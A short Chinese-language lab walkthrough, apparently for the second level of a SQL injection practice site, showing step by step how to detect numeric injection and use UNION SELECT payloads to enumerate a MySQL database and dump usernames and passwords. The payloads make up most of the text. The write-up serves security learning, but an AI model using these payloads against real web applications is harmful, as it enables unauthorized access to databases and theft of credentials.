# 第二关

## 1. 判断是否存在SQL注入
- 1 and 1=1 与 1 and 1=2 返回页面不同，存在数字型注入。
```python
 #正常
?id=1 and 1=1  
#无返回
?id=1 and 1=2   
```
!(示意图2-1)[]

## 2. 联合注入
1. 爆出表格的列数,列数是3
``` python
?id=1 order by 3
?id=1 order by 4
```

2. 找出回显位
```python 
?id=-1 union select 1,2,3
```

3. 爆出数据库名和数据库版本（数据库类型是MySQL）
```python 
?id=-1 union select 1,version(),database()
```
4. 爆出表名
```python
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
```

6. 爆出段名
```python
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
```

8. 爆出数据
```python
?id=-1 union select 1,2,group_concat(username, 0x7e, password) from users
```

